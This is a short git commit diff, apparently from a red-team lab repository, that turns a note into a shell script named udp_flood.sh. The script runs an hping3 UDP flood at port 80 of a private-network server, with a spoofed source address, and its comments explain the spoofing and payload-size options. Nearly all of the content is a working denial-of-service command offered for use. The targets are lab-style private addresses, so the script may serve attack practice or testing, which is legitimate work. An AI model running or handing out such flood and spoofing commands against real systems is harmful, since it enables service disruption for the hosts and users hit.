3846218750c42532d972e4e3c5c81315bdf78044
TiffanyClark225 <91997752+TiffanyClark225@users.noreply.github.com>
2024-04-21 19:39:48 -0400

    Update and rename udp_flood to udp_flood.sh

--- Red/udp_flood.sh
+++ Red/udp_flood.sh
@@ -1,5 +1,11 @@
-# Example
+# !/bin/bash
+
+echo "Starting udp flood attack ..."
+
 sudo hping3 --udp --flood -p 80 --interface eth4 --data 1024 -a 10.1.3.2 10.1.5.2 
+
+echo "Udp flood attack completed"
+
 # 10.1.5.2 is server
 # 10.1.3.2 is the src and can be changed IP src addr for spoofing
 # 1024 is size of data
